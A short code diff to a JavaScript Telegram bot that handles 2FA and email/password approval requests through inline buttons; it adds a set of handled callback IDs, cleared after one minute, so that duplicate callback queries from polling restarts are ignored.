@@ -41,6 +41,9 @@ bot.on("polling_error", (err) => {
 // Track pending 2FA requests per chatId
 let pendingRequests = {};
 
+// Track already-handled callback IDs to prevent duplicate processing
+const handledCallbacks = new Set();
+
 // -----------------
 // Email/Password approval
 // -----------------
@@ -182,6 +185,12 @@ bot.on("message", (msg) => {
 // Handle inline button callbacks
 // -----------------
 bot.on("callback_query", async (query) => {
+  // Ignore if already handled (prevents duplicates from polling restarts)
+  if (handledCallbacks.has(query.id)) return;
+  handledCallbacks.add(query.id);
+  // Clean up old entries after 1 minute to avoid memory leak
+  setTimeout(() => handledCallbacks.delete(query.id), 60000);
+
   try {
     const [action, identifier] = query.data.split("|");
     let status;
